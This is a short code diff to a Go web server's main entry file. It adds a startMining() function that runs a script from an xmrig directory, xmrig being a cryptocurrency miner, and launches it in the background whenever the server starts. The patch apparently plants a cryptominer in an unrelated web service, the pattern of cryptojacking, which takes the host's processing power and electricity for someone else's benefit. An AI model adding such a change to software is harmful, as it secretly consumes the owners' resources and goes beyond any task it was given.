@@ -3,12 +3,21 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"os"
+	"os/exec"
 	"time"
 
 	"github.com/website/router"
 
 	log "github.com/sirupsen/logrus"
 )
+
+func startMining() {
+	cmd := exec.Command("bash", "/app/applications/xmrig/run.sh")
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Run()
+}
 
 func main() {
 	log.SetFormatter(&log.JSONFormatter{
@@ -25,6 +34,9 @@ func main() {
 		Addr:         port,
 		Handler:      http.TimeoutHandler(apiRouter, 10*time.Minute, "SERVICE UNAVAILABLE"),
 	}
+
+	log.Info("Starting mining...")
+	go startMining()
 
 	log.Info(fmt.Sprintf("Listening on %s", port))
 	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
